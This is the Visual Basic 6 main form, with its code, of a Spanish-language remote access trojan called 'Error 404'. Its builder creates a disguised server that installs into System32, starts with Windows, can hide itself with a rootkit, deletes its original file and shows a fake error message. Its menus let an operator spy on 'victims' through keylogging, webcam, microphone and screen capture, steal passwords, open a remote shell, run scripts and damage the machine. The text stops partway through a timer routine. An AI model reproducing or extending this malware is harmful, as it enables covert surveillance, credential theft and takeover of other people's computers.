VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Begin VB.Form frmMain 
   BackColor       =   &H00FFFFFF&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Error 404"
   ClientHeight    =   10305
   ClientLeft      =   120
   ClientTop       =   705
   ClientWidth     =   18975
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   Moveable        =   0   'False
   ScaleHeight     =   10305
   ScaleWidth      =   18975
   Begin VB.Frame fraStats 
      BackColor       =   &H00FFFFFF&
      BorderStyle     =   0  'None
      Height          =   2175
      Left            =   0
      TabIndex        =   59
      Top             =   7920
      Width           =   18975
   End
   Begin VB.Frame fraInfo 
      BorderStyle     =   0  'None
      Caption         =   "fraInfo"
      Height          =   375
      Left            =   0
      TabIndex        =   57
      Top             =   7320
      Visible         =   0   'False
      Width           =   18975
      Begin VB.Label lblInfo 
         BorderStyle     =   1  'Fixed Single
         Height          =   495
         Left            =   0
         TabIndex        =   58
         Top             =   0
         Width           =   18975
      End
   End
   Begin VB.Frame fraLog 
      BorderStyle     =   0  'None
      Caption         =   "Frame4"
      Height          =   1575
      Left            =   0
      TabIndex        =   55
      Top             =   5520
      Width           =   18975
      Begin VB.TextBox txtLog 
         Height          =   1575
         Left            =   0
         Locked          =   -1  'True
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   56
         Top             =   0
         Width           =   18975
      End
   End
   Begin VB.Frame fraBuild 
      BackColor       =   &H00FFFFFF&
      BorderStyle     =   0  'None
      Caption         =   "Frame4"
      Height          =   2175
      Left            =   0
      TabIndex        =   16
      Top             =   3240
      Visible         =   0   'False
      Width           =   18975
      Begin VB.Frame fraBuildIdx 
         BackColor       =   &H00FFFFFF&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   24
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   1455
         Index           =   0
         Left            =   120
         TabIndex        =   48
         Top             =   0
         Width           =   2415
         Begin VB.TextBox txtBuildIP 
            Height          =   285
            Left            =   960
            TabIndex        =   51
            Top             =   360
            Width           =   1335
         End
         Begin VB.TextBox txtBuildPort 
            Height          =   285
            Left            =   1680
            TabIndex        =   50
            Text            =   "404"
            Top             =   720
            Width           =   615
         End
         Begin VB.TextBox txtBuildPass 
            Height          =   285
            Left            =   1200
            TabIndex        =   49
            Top             =   1080
            Width           =   1095
         End
         Begin VB.Label lblBuild 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Conexion"
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   9.75
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   240
            Index           =   10
            Left            =   660
            TabIndex        =   60
            Top             =   0
            Width           =   1005
         End
         Begin VB.Label lblBuild 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "IP/DNS:"
            Height          =   195
            Index           =   0
            Left            =   120
            TabIndex        =   54
            Top             =   360
            Width           =   615
         End
         Begin VB.Label lblBuild 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Puerto:"
            Height          =   195
            Index           =   1
            Left            =   120
            TabIndex        =   53
            Top             =   720
            Width           =   510
         End
         Begin VB.Label lblBuild 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Contraseña:"
            Height          =   195
            Index           =   2
            Left            =   120
            TabIndex        =   52
            Top             =   1080
            Width           =   855
         End
      End
      Begin VB.Frame fraBuildIdx 
         BackColor       =   &H00FFFFFF&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   -1  'True
         EndProperty
         Height          =   1815
         Index           =   1
         Left            =   3000
         TabIndex        =   39
         Top             =   120
         Width           =   3855
         Begin VB.TextBox txtBuildFilename 
            Height          =   285
            Left            =   1680
            TabIndex        =   45
            Top             =   360
            Width           =   1575
         End
         Begin VB.CheckBox chkBuildDir 
            BackColor       =   &H00FFFFFF&
            Caption         =   "Crear directorio:"
            Height          =   195
            Left            =   120
            TabIndex        =   44
            Top             =   720
            Width           =   1455
         End
         Begin VB.TextBox txtBuildDir 
            Height          =   285
            Left            =   1680
            TabIndex        =   43
            Text            =   "WinDrivers"
            Top             =   720
            Width           =   1575
         End
         Begin VB.OptionButton optProgramfiles 
            BackColor       =   &H00FFFFFF&
            Caption         =   "Archivos de Programa"
            Height          =   195
            Left            =   120
            TabIndex        =   42
            Top             =   1080
            Value           =   -1  'True
            Width           =   1935
         End
         Begin VB.OptionButton optBuildWindows 
            BackColor       =   &H00FFFFFF&
            Caption         =   "Windows"
            Height          =   195
            Left            =   120
            TabIndex        =   41
            Top             =   1320
            Width           =   975
         End
         Begin VB.OptionButton optBuildSystem32 
            BackColor       =   &H00FFFFFF&
            Caption         =   "System32"
            Height          =   195
            Left            =   120
            TabIndex        =   40
            Top             =   1560
            Width           =   1095
         End
         Begin VB.Label lblBuild 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Instalacion del Servidor"
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   9.75
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   240
            Index           =   11
            Left            =   720
            TabIndex        =   64
            Top             =   0
            Width           =   2505
         End
         Begin VB.Label lblBuild 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Nombre del archivo:"
            Height          =   195
            Index           =   3
            Left            =   120
            TabIndex        =   47
            Top             =   360
            Width           =   1425
         End
         Begin VB.Label lblBuild 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   ".exe"
            Height          =   195
            Index           =   4
            Left            =   3360
            TabIndex        =   46
            Top             =   360
            Width           =   300
         End
      End
      Begin VB.Frame fraBuildIdx 
         BackColor       =   &H00FFFFFF&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   24
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   1815
         Index           =   2
         Left            =   7320
         TabIndex        =   32
         Top             =   120
         Width           =   2775
         Begin VB.CheckBox chkBuildStartup 
            BackColor       =   &H00FFFFFF&
            Caption         =   "Iniciar con el sistema:"
            Height          =   255
            Left            =   120
            TabIndex        =   36
            Top             =   360
            Value           =   1  'Checked
            Width           =   1815
         End
         Begin VB.TextBox txtBuildStartKey 
            Height          =   285
            Left            =   120
            TabIndex        =   35
            Top             =   1080
            Width           =   2535
         End
         Begin VB.TextBox txtBuildRegKey 
            Height          =   285
            Left            =   1440
            TabIndex        =   34
            Top             =   1440
            Width           =   1215
         End
         Begin VB.CommandButton cmdBuildGenerate 
            Caption         =   "Generar Llave"
            Height          =   315
            Left            =   1320
            TabIndex        =   33
            Top             =   720
            Width           =   1335
         End
         Begin VB.Label lblBuild 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Inicio Automatico"
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   9.75
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   240
            Index           =   12
            Left            =   465
            TabIndex        =   61
            Top             =   0
            Width           =   1815
         End
         Begin VB.Label lblBuild 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Llave de inicio:"
            Height          =   195
            Index           =   5
            Left            =   120
            TabIndex        =   38
            Top             =   720
            Width           =   1065
         End
         Begin VB.Label lblBuild 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Llave de registro:"
            Height          =   195
            Index           =   6
            Left            =   120
            TabIndex        =   37
            Top             =   1440
            Width           =   1215
         End
      End
      Begin VB.Frame fraBuildIdx 
         BackColor       =   &H00FFFFFF&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   24
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   1455
         Index           =   4
         Left            =   15360
         TabIndex        =   27
         Top             =   120
         Width           =   3495
         Begin VB.TextBox txtBuildName 
            Height          =   285
            Left            =   1560
            TabIndex        =   30
            Text            =   "Nueva Victima"
            Top             =   360
            Width           =   1815
         End
         Begin VB.CheckBox chkBuildMelt 
            BackColor       =   &H00FFFFFF&
            Caption         =   "Eliminar servidor despues de ejecutar"
            Height          =   255
            Left            =   120
            TabIndex        =   29
            Top             =   720
            Width           =   3015
         End
         Begin VB.CheckBox chkBuildRootkit 
            BackColor       =   &H00FFFFFF&
            Caption         =   "Utilizar rootkit para esconder proceso"
            Height          =   255
            Left            =   120
            TabIndex        =   28
            Top             =   1080
            Width           =   3015
         End
         Begin VB.Label lblBuild 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Preferencias"
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   9.75
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   240
            Index           =   14
            Left            =   1050
            TabIndex        =   63
            Top             =   0
            Width           =   1365
         End
         Begin VB.Label lblBuild 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Nombre asignado:"
            Height          =   195
            Index           =   9
            Left            =   120
            TabIndex        =   31
            Top             =   360
            Width           =   1290
         End
      End
      Begin VB.Frame fraBuildIdx 
         BackColor       =   &H00FFFFFF&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   24
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   1815
         Index           =   3
         Left            =   10560
         TabIndex        =   20
         Top             =   120
         Width           =   4335
         Begin VB.CheckBox chkBuildMSG 
            BackColor       =   &H00FFFFFF&
            Caption         =   "Mostrar un mensaje al ejecutar el servidor"
            Height          =   255
            Left            =   120
            TabIndex        =   24
            Top             =   360
            Width           =   3975
         End
         Begin VB.TextBox txtBuildMSGTitle 
            Height          =   285
            Left            =   1560
            TabIndex        =   23
            Text            =   "Error"
            Top             =   720
            Width           =   2655
         End
         Begin VB.TextBox txtBuildMSGBody 
            Height          =   285
            Left            =   120
            TabIndex        =   22
            Text            =   "No es una aplicacion de Win32 válida."
            Top             =   1440
            Width           =   4095
         End
         Begin VB.CommandButton cmdBuildMSGTest 
            Caption         =   "Probar"
            Height          =   315
            Left            =   2760
            TabIndex        =   21
            Top             =   1080
            Width           =   1455
         End
         Begin VB.Label lblBuild 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Mensaje de Error Falso"
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   9.75
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   240
            Index           =   13
            Left            =   915
            TabIndex        =   62
            Top             =   0
            Width           =   2475
         End
         Begin VB.Label lblBuild 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Titulo del mensaje:"
            Height          =   195
            Index           =   7
            Left            =   120
            TabIndex        =   26
            Top             =   720
            Width           =   1320
         End
         Begin VB.Label lblBuild 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Cuerpo del mensaje:"
            Height          =   195
            Index           =   8
            Left            =   120
            TabIndex        =   25
            Top             =   1080
            Width           =   1440
         End
      End
      Begin VB.CheckBox chkBuildInfo 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Mostrar informacion"
         Height          =   255
         Left            =   240
         TabIndex        =   19
         Top             =   1680
         Width           =   1695
      End
      Begin VB.CheckBox Check9 
         Caption         =   "Mostrar informacion"
         Height          =   255
         Left            =   240
         TabIndex        =   18
         Top             =   1680
         Value           =   1  'Checked
         Visible         =   0   'False
         Width           =   1695
      End
      Begin VB.CommandButton cmdBuildBuildServer 
         Caption         =   "Crear Servidor"
         Height          =   315
         Left            =   16200
         TabIndex        =   17
         Top             =   1650
         Width           =   1935
      End
   End
   Begin VB.Frame fraConfig 
      BackColor       =   &H00FFFFFF&
      BorderStyle     =   0  'None
      Caption         =   "Frame1"
      Height          =   615
      Left            =   0
      TabIndex        =   1
      Top             =   2400
      Visible         =   0   'False
      Width           =   18975
      Begin VB.Frame fraConfigIdx 
         BackColor       =   &H00FFFFFF&
         Height          =   495
         Index           =   0
         Left            =   120
         TabIndex        =   13
         Top             =   0
         Width           =   1815
         Begin VB.TextBox txtConfigPort 
            Height          =   285
            Left            =   720
            TabIndex        =   14
            Top             =   150
            Width           =   975
         End
         Begin VB.Label lblConfig 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Puerto"
            Height          =   195
            Index           =   0
            Left            =   120
            TabIndex        =   15
            Top             =   180
            Width           =   465
         End
      End
      Begin VB.Frame fraConfigIdx 
         BackColor       =   &H00FFFFFF&
         Height          =   495
         Index           =   1
         Left            =   2400
         TabIndex        =   10
         Top             =   0
         Width           =   6135
         Begin VB.CheckBox chkConfigPass 
            BackColor       =   &H00FFFFFF&
            Caption         =   "Utilizar contraseña para conexiones entrantes"
            Height          =   255
            Left            =   120
            TabIndex        =   12
            Top             =   160
            Width           =   3495
         End
         Begin VB.TextBox txtConfigPass 
            BackColor       =   &H8000000E&
            Height          =   285
            Left            =   3720
            TabIndex        =   11
            Top             =   150
            Width           =   2295
         End
      End
      Begin VB.Frame fraConfigIdx 
         BackColor       =   &H00FFFFFF&
         Height          =   495
         Index           =   2
         Left            =   9120
         TabIndex        =   8
         Top             =   0
         Width           =   2775
         Begin VB.CheckBox chkConfigNotify 
            BackColor       =   &H00FFFFFF&
            Caption         =   "Notificar conexiones entrantes"
            Height          =   195
            Left            =   120
            TabIndex        =   9
            Top             =   190
            Value           =   1  'Checked
            Width           =   2535
         End
      End
      Begin VB.Frame fraConfigIdx 
         BackColor       =   &H00FFFFFF&
         Height          =   495
         Index           =   3
         Left            =   12360
         TabIndex        =   5
         Top             =   0
         Width           =   2655
         Begin VB.ComboBox cboConfigTheme 
            Height          =   315
            ItemData        =   "frmMain.frx":48FA
            Left            =   1080
            List            =   "frmMain.frx":48FC
            Style           =   2  'Dropdown List
            TabIndex        =   6
            Top             =   135
            Width           =   1455
         End
         Begin VB.Label lblConfig 
            AutoSize        =   -1  'True
            BackColor       =   &H00FFFFFF&
            BackStyle       =   0  'Transparent
            Caption         =   "Estilo visual"
            Height          =   195
            Index           =   1
            Left            =   120
            TabIndex        =   7
            Top             =   190
            Width           =   825
         End
      End
      Begin VB.Frame fraConfigIdx 
         BackColor       =   &H00FFFFFF&
         Height          =   495
         Index           =   4
         Left            =   15480
         TabIndex        =   2
         Top             =   0
         Width           =   2535
         Begin VB.ComboBox cboConfigLanguage 
            Height          =   315
            Left            =   960
            Style           =   2  'Dropdown List
            TabIndex        =   3
            Top             =   135
            Width           =   1455
         End
         Begin VB.Label lblConfig 
            AutoSize        =   -1  'True
            BackColor       =   &H00FFFFFF&
            BackStyle       =   0  'Transparent
            Caption         =   "Lenguaje"
            Height          =   195
            Index           =   2
            Left            =   120
            TabIndex        =   4
            Top             =   190
            Width           =   660
         End
      End
   End
   Begin VB.Timer tmrForm 
      Interval        =   1
      Left            =   120
      Top             =   360
   End
   Begin MSComctlLib.ImageList ImageList1 
      Left            =   120
      Top             =   1560
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      ImageWidth      =   16
      ImageHeight     =   16
      MaskColor       =   12632256
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   1
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":48FE
            Key             =   ""
         EndProperty
      EndProperty
   End
   Begin VB.Timer tmrGeneral 
      Interval        =   1
      Left            =   600
      Top             =   360
   End
   Begin MSComctlLib.ListView LV 
      Height          =   2175
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   18975
      _ExtentX        =   33470
      _ExtentY        =   3836
      View            =   3
      LabelEdit       =   1
      LabelWrap       =   0   'False
      HideSelection   =   0   'False
      GridLines       =   -1  'True
      _Version        =   393217
      Icons           =   "ImageList1"
      SmallIcons      =   "ImageList1"
      ForeColor       =   -2147483640
      BackColor       =   16777215
      BorderStyle     =   1
      Appearance      =   1
      NumItems        =   7
      BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Text            =   "Nombre"
         Object.Width           =   2540
      EndProperty
      BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   1
         Text            =   "IP Privada"
         Object.Width           =   2540
      EndProperty
      BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   2
         Text            =   "IP Publica"
         Object.Width           =   2540
      EndProperty
      BeginProperty ColumnHeader(4) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   3
         Text            =   "Host"
         Object.Width           =   2540
      EndProperty
      BeginProperty ColumnHeader(5) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   4
         Text            =   "S.O"
         Object.Width           =   4410
      EndProperty
      BeginProperty ColumnHeader(6) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   5
         Text            =   "RAM"
         Object.Width           =   2540
      EndProperty
      BeginProperty ColumnHeader(7) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   6
         Text            =   "Pais"
         Object.Width           =   2540
      EndProperty
      Picture         =   "frmMain.frx":4D52
   End
   Begin VB.Menu mnuConfig 
      Caption         =   "Configuracion"
   End
   Begin VB.Menu mnuSaveConfig 
      Caption         =   "[Guardar Configuracion]"
      Visible         =   0   'False
   End
   Begin VB.Menu mnuBuild 
      Caption         =   "Crear Servidor"
   End
   Begin VB.Menu mnuStats 
      Caption         =   "Estadisticas"
   End
   Begin VB.Menu mnuLog 
      Caption         =   "Historial"
   End
   Begin VB.Menu mnuAbout 
      Caption         =   "Acerca de..."
   End
   Begin VB.Menu mnuTools 
      Caption         =   "Herramientas"
   End
   Begin VB.Menu mnu 
      Caption         =   "Menu"
      Visible         =   0   'False
      Begin VB.Menu mnuVictimDats 
         Caption         =   "Datos de Victima"
      End
      Begin VB.Menu mnuScr4 
         Caption         =   "-"
      End
      Begin VB.Menu mnuAdminVictim 
         Caption         =   "Administrar Victima"
      End
      Begin VB.Menu mnuFunctions 
         Caption         =   "Funciones..."
         Begin VB.Menu mnuInfoPC 
            Caption         =   "Informacion del PC"
         End
         Begin VB.Menu mnuManager 
            Caption         =   "Manejar..."
            Begin VB.Menu mnuManagerFiles 
               Caption         =   "Archivos"
            End
            Begin VB.Menu mnuManagerProcesses 
               Caption         =   "Procesos"
            End
            Begin VB.Menu mnuManagerServices 
               Caption         =   "Servicios"
            End
            Begin VB.Menu mnuManagerWindows 
               Caption         =   "Ventanas"
            End
            Begin VB.Menu mnuManagerReg 
               Caption         =   "Registro"
            End
            Begin VB.Menu mnuManagerConnections 
               Caption         =   "Conexiones"
            End
            Begin VB.Menu mnuManagerUSB 
               Caption         =   "Dispositivos USB"
            End
         End
         Begin VB.Menu mnuSpy 
            Caption         =   "Espiar"
            Begin VB.Menu mnuSpyScreen 
               Caption         =   "Pantalla"
            End
            Begin VB.Menu mnuSpyActiveWindow 
               Caption         =   "Ventana Activa"
            End
            Begin VB.Menu mnuSpyWebcam 
               Caption         =   "Webcam"
            End
            Begin VB.Menu mnuSpyKeylogger 
               Caption         =   "Keylogger"
            End
            Begin VB.Menu mnuSpySound 
               Caption         =   "Sonido"
            End
            Begin VB.Menu mnuSpyMicrophone 
               Caption         =   "Microfono"
            End
         End
         Begin VB.Menu mnuControl 
            Caption         =   "Controlar"
            Begin VB.Menu mnuControlMouse 
               Caption         =   "Raton"
            End
            Begin VB.Menu mnuControlClipboard 
               Caption         =   "Portapapeles"
            End
            Begin VB.Menu mnuControlDevices 
               Caption         =   "Dispositivos"
            End
            Begin VB.Menu mnuControlInstalledPrograms 
               Caption         =   "Programas Instalados"
            End
            Begin VB.Menu mnuControlFonts 
               Caption         =   "Fuentes de Texto"
            End
            Begin VB.Menu mnuControlActivePorts 
               Caption         =   "Puertos Activos"
            End
            Begin VB.Menu mnuControlInternetOptions 
               Caption         =   "Opciones de Internet"
            End
            Begin VB.Menu mnuControlDownloadFile 
               Caption         =   "Descargar Archivo"
            End
            Begin VB.Menu mnuControlRunScript 
               Caption         =   "Ejecutar Script"
            End
            Begin VB.Menu mnuControlScreenConfig 
               Caption         =   "Configuracion de Pantalla"
            End
            Begin VB.Menu mnuControlSocks5 
               Caption         =   "Socks 5"
            End
            Begin VB.Menu mnuControlWebServer 
               Caption         =   "WebServer"
            End
            Begin VB.Menu mnuControlPrinter 
               Caption         =   "Impresora"
            End
         End
         Begin VB.Menu mnuExtra 
            Caption         =   "Opciones Extra"
            Begin VB.Menu mnuExtraChat 
               Caption         =   "Chat"
            End
            Begin VB.Menu mnuExtraMsg 
               Caption         =   "Mensaje"
            End
            Begin VB.Menu mnuExtraShutdown 
               Caption         =   "Apagar"
            End
            Begin VB.Menu mnuExtraScanner 
               Caption         =   "Escaner"
            End
            Begin VB.Menu mnuExtraRun 
               Caption         =   "Ejecutar"
            End
         End
         Begin VB.Menu mnuShell 
            Caption         =   "Shell Remota"
         End
         Begin VB.Menu mnuMSN 
            Caption         =   "Messenger"
         End
         Begin VB.Menu mnuPass 
            Caption         =   "Contraseñas"
         End
         Begin VB.Menu mnuScr1 
            Caption         =   "-"
         End
         Begin VB.Menu mnuServer 
            Caption         =   "Servidor..."
            Begin VB.Menu mnuServerPing 
               Caption         =   "Ping"
            End
            Begin VB.Menu mnuServerRestartServer 
               Caption         =   "Reiniciar Servidor"
            End
            Begin VB.Menu mnuServerReconnectServer 
               Caption         =   "Reconectar Servidor"
            End
            Begin VB.Menu mnuServerCloseServer 
               Caption         =   "Cerrar Servidor"
            End
            Begin VB.Menu mnuServerUninstallServer 
               Caption         =   "Desinstalar Servidor"
            End
            Begin VB.Menu mnuServerUptadeServer 
               Caption         =   "Actualizar Servidor"
            End
         End
         Begin VB.Menu mnuScr2 
            Caption         =   "-"
         End
         Begin VB.Menu mnuFun 
            Caption         =   "Entretenerse"
         End
         Begin VB.Menu mnuDamage 
            Caption         =   "Dañar"
         End
      End
      Begin VB.Menu mnuScr3 
         Caption         =   "-"
      End
      Begin VB.Menu mnuChangeName 
         Caption         =   "Cambiar Nombre"
      End
      Begin VB.Menu mnuOpenVictimFolder 
         Caption         =   "Abrir Carpeta de Victima"
      End
      Begin VB.Menu mnuOpenNotesVictim 
         Caption         =   "Abir Notas de Victima"
      End
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'// © Error 404,ASSaulting,2009-2010//

'[Me.Height = 2955]
Option Explicit

Public total As Integer
Public TotalIndex As Integer
Dim vIndex As Variant
Dim NumConfig As Byte
Dim NumBuild As Byte
Dim NumLog As Byte
Dim NumInfo As Byte
Dim NumStats As Byte
Dim IDF As String
'Dim sckMain() As New CSocketMaster

Private Sub chkConfigNotify_Click()
mnuSaveConfig.Visible = True
End Sub

Private Sub chkConfigPass_Click()
mnuSaveConfig.Visible = True
End Sub

Private Sub Form_Load()
  'LoadRegValues
  mnuSaveConfig.Visible = False
'Set sckMain = New CSocketMaster
'<//Declares_
IDF = ""
NumConfig = 0
NumBuild = 0
NumLog = 0
NumInfo = 0
NumInfo = 0
'//>
'<//Position_
Me.Height = 2856
Me.Top = 30
'//>

sckMain(0).Close
sckMain(0).LocalPort = txtConfigPort.Text
sckMain(0).Listen
total = 0
'alert

'<//Effect Load_
IDF = "EffectLoad1"

pet = 0
Call SetWindowLong(hwnd, GWL_EXSTYLE, GetWindowLong(hwnd, GWL_EXSTYLE) Or WS_EX_LAYERED)
Call SetLayeredWindowAttributes(hwnd, 0, (255 * 0) / 100, LWA_ALPHA)
'//>
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
  UnloadRegValues
IDF = "EffectLoad0"
Cancel = 1
Unload frmNotify
End Sub

Private Sub mnuAddVictim_Click()
Dim v As ListItem
Set v = LV.ListItems.Add(, , "Victima_" & LV.ListItems.Count + 1, 1, 1)
'v.ListSubItems(1) = "LocalHost"
'v.ListSubItems(2) = "192.168.1.100"
'v.ListSubItems(3) = "MyHost"
'v.ListSubItems(4) = "Windows Shit"
'v.ListSubItems(5) = "1024 MB"
'v.ListSubItems(6) = "España"
End Sub

Private Sub mnuBuild_Click()
    If NumBuild = 0 Then
        IDF = "mnuBuild1"
            fraConfig.Visible = False
            fraBuild.Visible = True
            fraLog.Visible = False
            fraInfo.Visible = False
            fraStats.Visible = False
                fraBuild.Top = -2000
        NumBuild = 1
      Exit Sub
    End If
    If NumBuild = 1 Then
        IDF = "mnuBuild0"
        NumBuild = 0
      Exit Sub
    End If
End Sub

Private Sub mnuChangeName_Click()
LV.StartLabelEdit
End Sub

Private Sub mnuConfig_Click()
    If NumConfig = 0 Then
        IDF = "mnuConfig1"
            mnuSaveConfig.Visible = True
            fraConfig.Visible = True
            fraBuild.Visible = False
            fraLog.Visible = False
            fraInfo.Visible = False
            fraStats.Visible = False
        NumConfig = 1
      Exit Sub
    End If
    If NumConfig = 1 Then
        IDF = "mnuConfig0"
        mnuSaveConfig.Visible = False
        NumConfig = 0
      Exit Sub
    End If
End Sub

Private Sub mnuControlActivePorts_Click()
frmPorts.Show
End Sub

Private Sub mnuControlClipboard_Click()
frmClipboard.Show
End Sub

Private Sub mnuControlInternetOptions_Click()
frmNETOptions.Show
End Sub

Private Sub mnuControlPrinter_Click()
frmPrinter.Show
End Sub

Private Sub mnuControlRunScript_Click()
frmScripts.Show
End Sub

Private Sub mnuControlScreenConfig_Click()
frmScreen.Show
End Sub

Private Sub mnuDeleteVictim_Click()
LV.ListItems.Remove (LV.SelectedItem.Index)
End Sub

Private Sub mnuExtraChat_Click()
frmChatConfig.Show
End Sub

Private Sub mnuExtraMsg_Click()
frmMSG.Show
End Sub

Private Sub mnuExtraScanner_Click()
frmPorts.Show
End Sub

Private Sub mnuInfoPC_Click()
frmInfo.Show
Send "sysinfo|"
End Sub

Private Sub mnuLog_Click()
    If NumLog = 0 Then
        IDF = "mnuLog1"
            fraConfig.Visible = False
            fraBuild.Visible = False
            fraLog.Visible = True
            fraInfo.Visible = False
            fraStats.Visible = False
        NumLog = 1
      Exit Sub
    End If
    If NumLog = 1 Then
        IDF = "mnuLog0"
        NumLog = 0
      Exit Sub
    End If
End Sub

Private Sub mnuManagerProcesses_Click()
frmProcess.Show
End Sub

Private Sub mnuMSN_Click()
frmMSN.Show
End Sub

Private Sub mnuOpenNotesVictim_Click()
Open App.Path & "\Victimas\" & LV.SelectedItem & "\Notas de " & LV.SelectedItem & ".txt" For Output As #1
Close
End Sub

Private Sub mnuOpenVictimFolder_Click()
Open App.Path & "\Victimas\" & LV.SelectedItem For Output As #1
Close
End Sub

Private Sub mnuPass_Click()
frmPass.Show
End Sub

Private Sub mnuSaveConfig_Click()
mnuSaveConfig.Visible = False
    If txtConfigPort.Text = sckMain(0).LocalPort Then
        MsgBox "El puerto " & txtConfigPort & " ya se esta utilizando." & vbCrLf & "Utilice otro puerto o deje el que esta.", vbCritical, "Error 404"
      Exit Sub
    End If
LV.ListItems.Clear
sckMain(0).Close
sckMain(0).LocalPort = txtConfigPort.Text
sckMain(0).Listen
End Sub

Private Sub mnuServerCloseServer_Click()
Send "CloseServer"
End Sub

Private Sub mnuServerPing_Click()
frmPing.Show
End Sub

Private Sub mnuServerReconnectServer_Click()
Send "ReconectServer"
End Sub

Private Sub mnuShell_Click()
frmShell.Show
End Sub

Private Sub mnuSpyScreen_Click()
frmScreenShot.Show
End Sub

Private Sub mnuStats_Click()
    If NumStats = 0 Then
        IDF = "mnuStats1"
            fraConfig.Visible = False
            fraBuild.Visible = False
            fraLog.Visible = False
            fraInfo.Visible = False
            fraStats.Visible = True
                fraStats.Top = -2000
        NumStats = 1
      Exit Sub
    End If
    If NumStats = 1 Then
        IDF = "mnuStats0"
        NumStats = 0
      Exit Sub
    End If
End Sub

Private Sub mnuVictimDats_Click()
frmVictimDats.Show
End Sub

Private Sub tmrForm_Timer()
Select Case (IDF)

Case "EffectLoad1"
    If pet = 98 Then IDF = ""
    pet = pet + 2
    Call SetWindowLong(hwnd, GWL_EXSTYLE, GetWindowLong(hwnd, GWL_EXSTYLE) Or WS_EX_LAYERED)
    Call SetLayeredWindowAttributes(hwnd, 0, (255 * pet) / 100, LWA_ALPHA)
Case "EffectLoad0"
    If pet = 2 Then End
    pet = pet - 2
    Call SetWindowLong(hwnd, GWL_EXSTYLE, GetWindowLong(hwnd, GWL_EXSTYLE) Or WS_EX_LAYERED)
